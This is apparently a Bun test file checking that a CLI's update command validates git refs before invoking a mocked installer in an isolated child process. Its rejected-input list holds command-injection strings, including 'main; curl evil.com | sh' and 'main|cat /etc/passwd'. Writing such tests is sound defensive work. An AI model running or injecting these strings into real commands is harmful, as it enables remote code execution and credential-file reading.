/** Ref validation through actual runUpdate, with installer and lock isolated in a private child. */
import { describe, it, expect } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

const root = resolve(import.meta.dir, "..");
const { repository } = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));

// This text executes ONLY in a fresh fixture subprocess. No mock reaches the parent test runner.
const fixtureSource = String.raw`
import { mock } from "bun:test";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
const root = process.env.MAW_UPDATE_FIXTURE_ROOT;
const installerBoundary = Symbol("fake installer reached");
const report = { installerInvocations: [], updateLockCalls: 0, forbiddenCalls: 0, installerReached: false, unexpected: false };
const forbidden = () => { report.forbiddenCalls++; throw new Error("fixture forbids real effects"); };
mock.module(join(root, "src/cli/cmd-version.ts"), () => ({ getVersionString: () => "maw fixture-before" })); // mock-boundary-ok: fresh child only, never parent runner
mock.module(join(root, "src/core/ghq.ts"), () => ({ ghqFindSync: forbidden })); // mock-boundary-ok: fresh child only
mock.module("child_process", () => ({ execSync: forbidden })); // mock-boundary-ok: fresh child only
mock.module(join(root, "src/cli/update-lock.ts"), () => ({ withUpdateLock: async fn => { report.updateLockCalls++; return await fn(); } })); // mock-boundary-ok: fake lock in fresh child, no global path touched
Bun.spawn = (argv, options) => {
  if (!Array.isArray(argv) || argv.length !== 4 || argv[0] !== "bun" || argv[1] !== "add" || argv[2] !== "-g" || typeof argv[3] !== "string" || !argv[3].startsWith("github:")) return forbidden();
  report.installerInvocations.push([...argv]);
  // Stop after the actual production install call, before fallback/global cleanup/link refresh.
  return { exited: Promise.reject(installerBoundary) };
};
Bun.spawnSync = forbidden;
globalThis.fetch = forbidden;
const originalExit = process.exit;
process.exit = code => { throw { fixtureExit: Number(code || 0) }; };
let code = 90;
try {
  const { runUpdate } = await import(join(root, "src/cli/cmd-update.ts"));
  await runUpdate(JSON.parse(process.env.MAW_UPDATE_FIXTURE_ARGS));
  report.unexpected = true;
} catch (error) {
  if (error === installerBoundary) { report.installerReached = true; code = 0; }
  else if (error && Number.isInteger(error.fixtureExit)) code = error.fixtureExit;
  else report.unexpected = true;
} finally {
  process.exit = originalExit;
  writeFileSync(process.env.MAW_UPDATE_FIXTURE_REPORT, JSON.stringify(report));
  process.exitCode = code;
}
`;

interface FixtureReport {
  installerInvocations: string[][];
  updateLockCalls: number;
  forbiddenCalls: number;
  installerReached: boolean;
  unexpected: boolean;
}
async function runUpdateFixture(args: string[]) {
  const sandbox = mkdtempSync(join(tmpdir(), "maw-update-ref-fixture-"));
  const reportPath = join(sandbox, "report.json");
  // No inherited environment, PATH override or actual CLI entry/audit/bootstrap path.
  const proc = Bun.spawn([process.execPath, "--eval", fixtureSource], {
    cwd: root, stdout: "pipe", stderr: "pipe",
    env: { HOME: sandbox, BUN_INSTALL: join(sandbox, ".bun"), MAW_CLI: "1", MAW_TEST_MODE: "1",
      MAW_UPDATE_FIXTURE_ROOT: root, MAW_UPDATE_FIXTURE_REPORT: reportPath,
      MAW_UPDATE_FIXTURE_ARGS: JSON.stringify(args) },
  });
  const timer = setTimeout(() => proc.kill("SIGKILL"), 8_000);
  try {
    const [stdout, stderr, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
    const report = JSON.parse(readFileSync(reportPath, "utf8")) as FixtureReport;
    return { code, stdout, stderr, report };
  } finally {
    clearTimeout(timer);
    if (proc.exitCode === null) { proc.kill("SIGKILL"); await proc.exited; }
    rmSync(sandbox, { recursive: true, force: true });
  }
}

function noUnexpectedEffects(report: FixtureReport) {
  expect(report.forbiddenCalls).toBe(0);
  expect(report.unexpected).toBe(false);
}

describe("H3 — valid refs reach deterministic fake installer", () => {
  for (const ref of ["main", "feat/my-feature", "v2.0.0-alpha.121", "abc1234", "release/2.0.0", "1.2.3"]) {
    it(`valid ref '${ref}' passes the production allowlist and invokes installer exactly once`, async () => {
      const result = await runUpdateFixture(["update", ref, "--yes"]);
      expect(result.code).toBe(0);
      expect(result.stderr).not.toContain("invalid ref");
      expect(result.report.installerInvocations).toEqual([["bun", "add", "-g", `github:${repository}#${ref}`]]);
      expect(result.report.updateLockCalls).toBe(1);
      expect(result.report.installerReached).toBe(true);
      noUnexpectedEffects(result.report);
    }, 15_000);
  }
  it("omitted ref resolves to main without treating --yes as a ref", async () => {
    const result = await runUpdateFixture(["update", "--yes"]);
    expect(result.code).toBe(0);
    expect(result.report.installerInvocations).toEqual([["bun", "add", "-g", `github:${repository}#main`]]);
    expect(result.report.installerReached).toBe(true);
    noUnexpectedEffects(result.report);
  }, 15_000);
});

describe("H3 — rejected refs have zero installer/lock invocation", () => {
  const invalid = ["main; curl evil.com | sh", "main|cat /etc/passwd", "$(whoami)", "`id`", "main && fixture", "ref with spaces", "ref\nnewline", "ref\x00null", "--unknown-ref-flag"];
  for (const [index, ref] of invalid.entries()) {
    it(`rejects unsafe ref case ${index + 1} before any installer or update lock`, async () => {
      const result = await runUpdateFixture(["update", ref, "--yes"]);
      expect(result.code).toBe(1);
      expect(result.stderr).toContain("invalid ref");
      expect(result.report.installerInvocations).toEqual([]);
      expect(result.report.updateLockCalls).toBe(0);
      expect(result.report.installerReached).toBe(false);
      noUnexpectedEffects(result.report);
    }, 10_000);
  }
  it("--help short-circuits before installer and update lock", async () => {
    const result = await runUpdateFixture(["update", "main", "--help"]);
    expect(result.code).toBe(0);
    expect(result.stdout).toContain("usage: maw update [ref]");
    expect(result.report.installerInvocations).toEqual([]);
    expect(result.report.updateLockCalls).toBe(0);
    noUnexpectedEffects(result.report);
  }, 10_000);
});
